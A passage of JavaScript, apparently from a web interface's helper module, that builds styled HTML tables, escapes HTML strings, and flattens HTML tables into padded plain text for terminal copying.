                html += '<td style="padding:5px 10px; border-bottom:1px solid #2d1f4e; color:#d1d5db;">' + cell + '</td>';
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        // Safe HTML encoding — avoids innerHTML injection from user input
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        // Converts HTML tables to plain text for terminal copy — used by BoxEngine
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(function(table) {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(function(row) {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(function(c) { return c.textContent.trim().padEnd(20); });
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }

};
